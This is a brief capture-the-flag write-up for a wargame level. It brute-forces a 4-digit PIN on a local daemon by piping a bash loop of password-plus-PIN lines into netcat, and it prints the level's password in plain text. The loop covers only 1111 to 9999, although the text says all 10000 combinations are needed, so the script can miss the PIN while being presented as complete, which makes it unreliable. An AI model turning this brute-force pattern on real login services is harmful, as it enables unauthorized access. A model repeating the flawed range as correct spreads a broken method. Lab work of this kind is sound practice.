Description:
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

---

Solution:
# So what we need to do is to supply the command line with all the necessary combinations to bruteforce that
# What i did
mkdir -p /tmp/zoe
cd /tmp/zoe
vim zoaki.sh
# Contents of zoaki.sh
for i in {1111..9999}
    do
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done
# after taht
chmod +x zoaki.sh
./zoaki.sh | nc localhost 30002
# and thats all there is to it
# u can add the pipe at the next line of the script after done i just didnt want to
